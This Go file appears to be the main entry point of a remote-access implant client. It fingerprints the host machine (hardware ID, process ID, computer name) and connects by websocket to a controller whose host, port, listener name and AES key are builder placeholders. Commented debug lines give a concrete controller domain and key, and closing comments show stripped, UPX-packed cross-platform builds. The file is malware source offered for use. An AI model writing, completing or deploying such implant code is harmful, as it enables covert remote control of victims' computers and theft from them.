//go:build windows
// +build windows

package main

import (
	"fmt"

	Function "main/Helper/function"
	"main/PcInfo"
	Websocket "main/Socket/ws"
	"strings"
)

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

var ClientWorking bool

func main() {

	PcInfo.ProcessID = PcInfo.GetProcessID()
	PcInfo.HWID = PcInfo.GetHWID()
	PcInfo.ClrVersion = Function.GetClrVersion()
	PcInfo.GroupInfo = "Windows"
	PcInfo.ClientComputer = PcInfo.GetClientComputer()
	//release
	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
	Port := "PortAAAABBBBCCCCDDDD"
	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	route := "RouteAAAABBBBCCCCDDDD"
	PcInfo.AesKey = "AeskAAAABBBBCCCC"
	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
	///Debug
	// Host := "10.211.55.4"
	// Port := "8888"
	// PcInfo.ListenerName = "asd"
	// PcInfo.AesKey = "QWERt_CSDMAHUATW"
	// route := "www"
	// // //url := "ws://www.sftech.shop:443//www"
	url := "ws://" + Host + ":" + Port + "/" + route

	// url := "ws://tests.sftech.shop:443/Echo"
	url = strings.ReplaceAll(url, " ", "")
	fmt.Println(url)
	Websocket.Run_main(url)
}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
